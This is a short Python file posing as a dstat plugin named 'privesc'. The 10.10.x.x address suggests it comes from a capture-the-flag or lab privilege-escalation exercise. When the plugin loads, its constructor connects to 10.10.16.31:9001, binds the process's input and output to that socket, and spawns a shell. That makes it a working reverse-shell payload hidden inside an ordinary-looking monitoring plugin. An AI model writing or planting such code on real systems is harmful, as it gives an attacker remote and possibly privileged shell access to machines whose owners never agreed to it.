class dstat_plugin(dstat):
    """
    Escalating privileges
    """
    def __init__(self):
        self.name = 'privesc'
        self.nick = ('privesc',)
        self.vars = ('pwned',)
        self.type = 's'
        self.width = 20
        self.scale = 0

        import socket,subprocess,os
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("10.10.16.31",9001))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        import pty
        pty.spawn("sh")

    def extract(self):
        self.val['pwned'] = 'In progress!'
